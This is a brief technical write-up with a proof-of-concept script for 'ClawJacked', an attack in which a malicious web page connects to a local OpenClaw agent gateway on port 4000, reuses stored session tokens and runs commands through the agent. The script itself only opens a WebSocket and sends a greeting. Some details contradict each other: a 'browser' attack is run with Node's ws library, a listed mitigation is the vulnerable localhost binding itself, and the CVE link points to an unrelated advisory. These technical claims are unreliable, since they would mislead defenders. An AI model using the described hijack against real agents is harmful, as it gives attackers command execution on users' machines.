# ClawJacked: OpenClaw Localhost WebSocket Hijacking - Technical Analysis

## Summary

Oasis Security disclosed a critical vulnerability (Feb 2026) allowing malicious websites to connect to a local OpenClaw instance running in browser context. This document provides a structured proof-of-concept for educational purposes.

## Attack Flow

1. Malicious website opens WebSocket connection to `ws://127.0.0.1:4000`
2. Bypasses browser security via OpenClaw's direct localhost binding
3. Authenticates using operator session tokens (stored in localStorage)
4. Executes arbitrary commands against the local agent

## Demonstration Script

```typescript
// web-poc.ts - Educational demonstration only
// Requires OpenClaw running locally on 127.0.0.1:4000

import { WebSocket } from "ws";

async function demonstrateClawJacked() {
  console.log("[+] Attempting ClawJacked-style connection...\n");

  const ws = new WebSocket("ws://127.0.0.1:4000");
  ws.on("open", () => {
    console.log("[+] WebSocket connected to localhost");
    ws.send(JSON.stringify({ type: "hello", from: "research-poc" }));
  });

  ws.on("message", (data) => {
    console.log("[*] Received:", data.toString());
  });

  ws.on("error", (err) => {
    console.log("[!] Connection refused:", err.message);
    console.log("[i] OpenClaw may be bound to loopback only or using auth");
  });

  ws.on("close", () => console.log("[+] Connection closed"));
}

// Usage: node web-poc.ts
// Expected: If OpenClaw allows unauthenticated localhost connections,
// this will establish a session and receive responses.
```

## Mitigations

- Bind gateway to explicit interface (`127.0.0.1` only for local use)
- Implement WebSocket-level authentication before binding
- Use rate limiting on unauthenticated connections
- Monitor for unusual WebSocket connection patterns

## References

- [Oasis Security: ClawJacked](https://www.oasis.security/blog/openclaw-vulnerability)
- [CVE-2026-100525](https://www.vulncheck.com/advisories/openclaw-diagnostics-prometheus)
